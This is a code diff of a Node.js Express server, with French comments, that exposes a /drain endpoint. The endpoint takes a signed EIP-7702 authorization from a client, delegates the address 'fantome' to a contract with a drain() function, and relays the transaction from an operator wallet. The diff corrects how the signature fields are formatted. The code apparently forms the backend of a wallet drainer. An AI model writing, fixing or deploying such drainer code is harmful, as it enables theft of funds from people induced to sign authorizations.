@@ -10,8 +10,6 @@ const provider = new JsonRpcProvider(RPC);
 const wallet = new Wallet(PK, provider);
 const iface = new Interface(["function drain()"]);
 
-const clean = (h) => (typeof h === "string" && h.startsWith("0x") ? h.slice(2) : h);
-
 const app = express();
 app.use(cors());
 app.use(express.json());
@@ -29,8 +27,6 @@ app.get("/test", async (req, res) => {
       address: CONTRACT,
       nonce: authNonce,
     });
-
-    console.log("AUTH SIGNEE:", String(auth.chainId), String(auth.nonce), auth.yParity, auth.r, auth.s);
 
     const nonce = await provider.getTransactionCount(wallet.address, "latest");
     const fee = await provider.getFeeData();
@@ -66,20 +62,16 @@ app.post("/drain", async (req, res) => {
       return res.status(400).json({ error: "r ou s manquant dans auth" });
     }
 
-    let yp = auth.yParity;
-    if (typeof yp === "string" && yp.startsWith("0x")) yp = parseInt(yp, 16);
-    yp = Number(yp);
-    if (yp >= 27) yp = yp - 27;
-
     const authNonce = await provider.getTransactionCount(fantome, "latest");
 
+    // On reprend EXACTEMENT le format produit par authorize() : r/s avec 0x, yParity en hex
     const authorization = {
       chainId: BigInt(auth.chainId),
       address: CONTRACT,
       nonce: BigInt(authNonce),
-      yParity: yp,
-      r: clean(auth.r),
-      s: clean(auth.s),
+      yParity: "0x" + Number(auth.yParity).toString(16),
+      r: auth.r.startsWith("0x") ? auth.r : "0x" + auth.r,
+      s: auth.s.startsWith("0x") ? auth.s : "0x" + auth.s,
     };
 
     const nonce = await provider.getTransactionCount(wallet.address, "latest");
